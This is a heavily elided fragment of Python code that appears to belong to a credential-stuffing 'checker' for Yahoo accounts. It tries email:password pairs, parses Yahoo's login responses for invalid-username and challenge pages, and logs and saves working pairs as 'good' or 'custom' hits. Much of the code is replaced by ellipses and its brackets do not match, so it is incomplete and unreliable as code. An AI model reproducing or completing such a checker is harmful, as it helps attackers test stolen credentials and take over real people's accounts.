        ...
        try:
            ...
            with Session() as s:
                ...
                if "INVALID_USERNAME" in r.text or "INVALID_IDENTIFIER" in r.text:
                    ...
                    "account/challenge/phone-obfuscation" in r.text
                    or ">Open any Yahoo app<" in r.text
                ):
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Yahoo")
                    save(
                        "Yahoo",
                        "custom",
                        Checker.time,
                ...
                if "account/challenge/password" in r.text:
                    ...
                    "/challenge/challenge-selector" in r.text
                    or "/challenge/phone-obfuscation" in r.text
                ):
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Yahoo")
                    save(
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Yahoo")
